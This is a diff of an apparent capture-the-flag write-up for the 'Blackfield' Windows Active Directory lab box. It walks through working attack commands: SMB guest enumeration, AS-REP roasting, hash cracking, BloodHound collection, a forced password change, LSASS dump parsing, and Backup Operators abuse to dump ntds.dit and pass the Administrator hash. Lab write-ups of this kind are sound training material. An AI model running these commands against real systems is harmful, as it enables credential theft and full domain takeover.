@@ -27,12 +27,12 @@ os: Windows
 
 <div class="divider divider-info">
     <span class="divider-title">TL;DR</span>
-    <span class="divider-content">Brief one-paragraph summary of the box - what vulnerabilities were exploited and key techniques used.</span>
+    <span class="divider-content">Blackfield is a Windows Active Directory box that demonstrates authentication bypass and privilege escalation through misconfigured permissions. The attack chain involves enumerating SMB shares as Guest to discover user accounts, exploiting AS-REP Roasting on an account without Kerberos pre-authentication, using BloodHound to identify ForceChangePassword privileges for lateral movement, extracting credentials from an LSASS memory dump, and finally leveraging Backup Operators group membership to dump NTDS.dit and achieve Domain Admin access.</span>
 </div>
 **Key Vulnerabilities:**
-- Vulnerability 1
-- Vulnerability 2
-- Vulnerability 3
+- AS-REP Roasting (UF_DONT_REQUIRE_PREAUTH on support account)
+- ForceChangePassword privilege on audit2020 account
+- Backup Operators group privilege escalation to Domain Admin
 
 ---
 
@@ -42,9 +42,9 @@ os: Windows
 
 **Initial scan:**
 ```bash
-nmap -vv -T5 -p- *TARGET_IP*
+nmap -vv -T5 -p- 10.129.229.17
 
-nmap -vv -T5 -p*DISOVERED_PORTS* -sC -sV *TARGET_IP*
+nmap -vv -T5 -p53,88,135,139,389,445,593,3268,5985 -sC -sV 10.129.229.17
 ```
 
 **Results:**
@@ -62,7 +62,7 @@ nmap -vv -T5 -p*DISOVERED_PORTS* -sC -sV *TARGET_IP*
 | 5985 | WinRM    | TCP     |
 
 **Key findings:**
-- SMB: Allowed to authenticate as `Guest` and to enumerate active shares
+- SMB: Allowed to authenticate as `Guest` and enumerate active shares
 
 ### LDAP Enumeration
 
@@ -72,11 +72,11 @@ nmap -p 389 --script ldap-rootdse 10.129.229.17
 
 ![](../assets/images/Pasted%20image%2020260123172944.png)
 
-The target machine is `DC01` and the domain is `Blackfield.local`, need to update our `/etc/hosts` accordingly.
+The target machine is `DC01` and the domain is `Blackfield.local`. We need to update our `/etc/hosts` accordingly.
 
 ![](../assets/images/Pasted%20image%2020260123173303.png)
 
-In this case we also need to create a fitting `krb5.conf`, I used NXC for that:
+In this case, we also need to create a fitting `krb5.conf`. I used NXC for that:
 ```
 ❯ nxc smb 10.129.229.17 -u 'Guest' -p '' --generate-krb5-file krb5.conf
 ```
@@ -112,7 +112,7 @@ In this case we also need to create a fitting `krb5.conf`, I used NXC for that:
 
 ![](../assets/images/Pasted%20image%2020260123172218.png)
 
-We have 'Read' permissions  for `profiles$` as `Guest`, which is a custom share and worth checking out.
+We have 'Read' permissions for `profiles$` as `Guest`, which is a custom share and worth checking out.
 
 ```
 ❯ smbclient //10.129.229.17/profiles$ -U "Guest"%
@@ -121,7 +121,8 @@ smb: \> ls
 ```
 
 ![](../assets/images/Pasted%20image%2020260123172348.png)
-Seems like we found a list of users, its possible to generate a list with the following command:
+
+It seems we found a list of users. It's possible to generate a list with the following command:
 ```
 ❯ smbclient -N \\\\10.129.229.17\\profiles$ -c ls | awk '{ print $1 }' > userlist.txt
 ```
@@ -129,15 +130,15 @@ Seems like we found a list of users, its possible to generate a list with the fo
 
 ## Initial Foothold
 
-With the acquired user list, we can attempt to run `Impacket-GetNPUsers` to find users without pre-auth
+With the acquired user list, we can attempt to run `Impacket-GetNPUsers` to find users without pre-authentication:
 ```
 ❯ impacket-GetNPUsers blackfield.local/ -no-pass -usersfile userlist.txt -dc-ip 10.129.229.17
 ```
-We found that the user `Support` has no pre-auth required
+We found that the user `support` has no pre-authentication required.
 
 ![](../assets/images/Pasted%20image%2020260123184759.png)
 
-We create a new .txt file that contains the hash and attempt to crack with `john`
+We create a new .txt file that contains the hash and attempt to crack it with `john`:
 
 ```
 ❯ john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt
@@ -149,14 +150,14 @@ We create a new .txt file that contains the hash and attempt to crack with `john
 
 ### Vulnerability Discovery
 
-**Vulnerability:** [Vulnerability Name]
+**Vulnerability:** AS-REP Roasting (UF_DONT_REQUIRE_PREAUTH)
 
 <div class="divider divider-info">
     <span class="divider-title">UF_DONT_REQUIRE_PREAUTH</span>
-    <span class="divider-content">a misconfiguration in Kerberos authentication where the pre-authentication requirement is disabled for user accounts in Active Directory. This creates a security weakness that attackers can exploit through an attack called AS-REP Roasting.</span>
+    <span class="divider-content">A misconfiguration in Kerberos authentication where the pre-authentication requirement is disabled for user accounts in Active Directory. This creates a security weakness that attackers can exploit through an attack called AS-REP Roasting.</span>
 </div>
 
-Now we will confirm the credentials using NXC before moving on
+Now we will confirm the credentials using NXC before moving on:
 ```
 ❯ nxc smb 10.129.229.17 -u 'support' -p '#00^BlackKnight' --shares
 ```
@@ -166,15 +167,15 @@ Now we will confirm the credentials using NXC before moving on
 ---
 ### Lateral Movement
 
-Now that we have valid credentials, we will use bloodhound-ce-py to enumerate the domain
+Now that we have valid credentials, we will use bloodhound-ce-py to enumerate the domain:
 
 ```
 bloodhound-ce-python -c All -d BLACKFIELD.LOCAL -k --zip -u support -p '#00^BlackKnight' -ns 10.129.229.17
 ```
 
-Now the usual - Boot up bloodhound ----> Log In ----> Upload the zip ----> Profit?
+Now the usual—boot up BloodHound, log in, upload the zip, and analyze.
 
-First thing to check is compromised assets, in this case `support@blackfield.local`, and we find that this account has `ForceChangePassword` rights on `Audit2020@blackfield.local` 
+First thing to check is compromised assets. In this case, `support@blackfield.local`, and we find that this account has `ForceChangePassword` rights on `audit2020@blackfield.local`.
 
 ![](../assets/images/Pasted%20image%2020260123190918.png)
 
@@ -211,23 +212,23 @@ We can now enumerate the `forensic` SMB share.
 
 ![](../assets/images/Pasted%20image%2020260123192742.png)
 
-We find an interesting folder `memory_analysis` and inside it `lsass.zip` since `lsass` is very commonly targeted for credentials, it makes sense to start by taking a look inside.
+We find an interesting folder `memory_analysis` and inside it `lsass.zip`. Since `lsass` is commonly targeted for credentials, it makes sense to start by taking a look inside.
 
 ![](../assets/images/Pasted%20image%2020260123192957.png)
 
-Seems to be a memory dump of lsass, this is useful, as we can now use `pypykatz` to retrieve hashes from the dump.
+It appears to be a memory dump of lsass. This is useful, as we can now use `pypykatz` to retrieve hashes from the dump.
 
 ![](../assets/images/Pasted%20image%2020260123193130.png)
 
-Lets try to authenticate with the `NT` hash
+Let's try to authenticate with the `NT` hash:
 
 ![](../assets/images/Pasted%20image%2020260123193247.png)
 
-Authentication works! and this user is very likely to give us a foothold, we can check bloodhound for confirmation.
+Authentication works! This user is very likely to give us a foothold. We can check BloodHound for confirmation.
 
 ![](../assets/images/Pasted%20image%2020260123193356.png)
 
-This is a big win, `svc_backup` is in `Backup Operators` which means we can use it to get `Domain Admin` easily.
+This is a big win. `svc_backup` is in the `Backup Operators` group, which means we can use it to get `Domain Admin` easily.
 
 **Getting a shell:**
 ```bash
@@ -257,7 +258,7 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
 
 <div class="divider divider-warning">
     <span class="divider-title">Exploitation Path</span>
-    <span class="divider-content">the ability of Backup Operators to create volume shadow copies and access sensitive files such as the `ntds.dit` database and registry hives (`SYSTEM`, `SAM`, `SECURITY`) allows for simple privilege escalation path.</span>
+    <span class="divider-content">The ability of Backup Operators to create volume shadow copies and access sensitive files such as the ntds.dit database and registry hives (SYSTEM, SAM, SECURITY) provides a simple privilege escalation path.</span>
 </div>
 
 **Exploitation steps:**
@@ -283,7 +284,7 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> download SECURITY .
 evil-winrm-py PS C:\Users\svc_backup\Documents> download SYSTEM .
 ```
 
-**Step 4: run `impacket-secretsdump` to parse the hives and get the `Administrator` NTLM hash.
+**Step 4:** Run `impacket-secretsdump` to parse the hives and get the `Administrator` NTLM hash
 ```bash
 # Command
 /home/Yuval/H/Blackfield ❯ impacket-secretsdump LOCAL -sam SAM -security SECURITY -ntds ntds.dit -system SYSTEM 
@@ -325,10 +326,13 @@ evil-winrm-py PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
 
 ## References
 
-- [Vulnerability Name - CVE-XXXX-XXXXX](https://cve.mitre.org/)
-- [GTFOBins - Tool](https://gtfobins.github.io/)
-- [HackTricks - Technique](https://book.hacktricks.xyz/)
-- [OWASP - Vulnerability Type](https://owasp.org/)
+- [AS-REP Roasting - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+- [BloodHound - GitHub](https://github.com/BloodHoundAD/BloodHound)
+- [Backup Operators to Domain Admin - GitHub PoC](https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC)
+- [Mimikatz & LSASS Dumping - HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)
+- [pypykatz - GitHub](https://github.com/skelsec/pypykatz)
+- [Impacket Toolkit - GitHub](https://github.com/fortra/impacket)
+- [Active Directory Privilege Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
 
 ---
 
@@ -338,7 +342,7 @@ evil-winrm-py PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
 graph LR
     A[Nmap Scan] --> B[SMB Enum]
     B --> C[Vuln Discovery]
-    C --> D[Bloodhound]
+    C --> D[BloodHound]
     D --> E[Lateral Movement]
     E --> F[SMB Enum]
     F --> G[Backup Operator Access]
